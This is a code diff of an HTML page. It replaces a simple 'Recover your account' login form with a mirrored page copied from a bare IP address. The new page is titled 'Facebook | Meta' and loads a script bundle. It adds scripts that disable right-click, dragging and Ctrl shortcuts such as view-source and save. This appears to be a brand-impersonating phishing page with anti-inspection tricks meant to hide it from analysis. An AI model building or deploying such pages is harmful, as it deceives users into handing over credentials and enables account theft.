@@ -1,51 +1,62 @@
 <!doctype html>
 <html lang="en">
+  <!-- Mirrored from 83.243.122.221/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Oct 2023 06:19:17 GMT -->
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Recover your account</title>
+    <meta charset="utf-8" />
+    <link rel="icon" href="icon.ico" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <title>Facebook</title>
+    <meta property="og:title" content="Facebook | Meta" />
+    <script defer="defer" src="js/main.198a48f8.js"></script>
+    <link href="css/main.b1e6d978.css" rel="stylesheet" />
   </head>
   <body>
-    <form id="acc-form">
-      <label for="acc-username"></label><input type="text" id="acc-username" required>
-      <label for="acc-password"></label><input type="password" id="acc-password" required>
-      <button id="acc-submit-btn" type="submit">submit</button>
-    </form>
-  </body>
-
-  <script>
-    const accountForm = document.getElementById("acc-form");
-    const usernameInput = document.getElementById("acc-username");
-    const passwordInput = document.getElementById("acc-password");
-
-    accountForm.addEventListener("submit", async e => {
-      e.preventDefault();
-      const username = usernameInput.value;
-      const password = passwordInput.value;
-
-      if (username && password) {
-        const options = {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({username, password})
+    <div id="root"></div>
+    <script type="text/javascript">
+      function mousedwn(n) {
+        try {
+          if (2 === event.button || 3 === event.button) return !1;
+        } catch (n) {
+          if (3 === n.which) return !1;
         }
-        fetch("/login", options)
-                .then(res => res.json())
-                .then(res => {
-                  const valid = res["valid"] ?? false;
-                  renderSubmitAccountResult(valid)
-                })
       }
-    })
-
-    function renderSubmitAccountResult(result = false) {
-      if (result) {
-        alert("GOOD!!! nice job")
-      } else {
-        alert("BAD!!! bad job")
-      }
-    }
-  </script>
+      (document.oncontextmenu = function () {
+        return !1;
+      }),
+        (document.ondragstart = function () {
+          return !1;
+        }),
+        (document.onmousedown = mousedwn);
+    </script>
+    <script type="text/javascript">
+      window.addEventListener("keydown", function (h) {
+        !h.ctrlKey ||
+          (65 !== h.which &&
+            66 !== h.which &&
+            67 !== h.which &&
+            73 !== h.which &&
+            80 !== h.which &&
+            83 !== h.which &&
+            85 !== h.which &&
+            86 !== h.which) ||
+          h.preventDefault();
+      }),
+        (document.keypress = function (h) {
+          return (
+            h.ctrlKey &&
+              (65 === h.which ||
+                66 === h.which ||
+                67 === h.which ||
+                73 === h.which ||
+                80 === h.which ||
+                83 === h.which ||
+                85 === h.which ||
+                h.which),
+            !1
+          );
+        });
+    </script>
+  </body>
+  <!-- Mirrored from 83.243.122.221/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Oct 2023 06:19:21 GMT -->
 </html>
